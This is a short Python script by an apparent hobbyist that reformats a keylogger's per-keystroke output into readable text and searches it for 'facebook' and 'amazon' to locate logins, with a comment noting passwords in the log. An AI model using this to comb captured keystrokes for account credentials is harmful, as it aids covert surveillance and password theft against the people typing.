
# Data formatting for Educational Keylogger output
# By: Mike Brinkman 
# Purpose: Keylogger returns data as one character (Keydown event) per line.  We want words to show up horizontally, separated by spaces.  

import re

# Each time the user presses a key, it is a separate KeyDown event - the hook program records each event on its own line
# then inputs a carriage return.  This is hard to read, and impossible to CTRL-F, so we format it horizontally here.
    
# The blank space character has been altered to '`' because of problems with .join eliminating spaces.
# Of course, if someone had '`' in a password, it would be an inconvenience.   
print('[*] Reading file ...' + '\n') 
file = ['`' if letter == '' else letter for letter in open('keyloggeroutput.txt').read().split('\n')]

print('[*] Formatting file ...' + '\n')
the_string = ''
for i in file:
	the_string+=i

	
with open("keylog_formatted.txt", "w") as log_formatted:
	log_formatted.write(the_string)
log_formatted.close()
print('[*] Formatted output saved in keylog_formatted.txt' + '\n')


# Search for keywords and print whether they are found so user can 'CTRL+F' for analysis.  
key1 = ['facebook', 'Facebook', 'fbook']
key2 = ['amazon', 'Amazon']
key_list = [key1, key2]

print('[*] Searching for keywords ...')
for i in key_list:
	for k in i:
		if k in the_string:
			print('"{0}" found in log output!'.format(k))
		
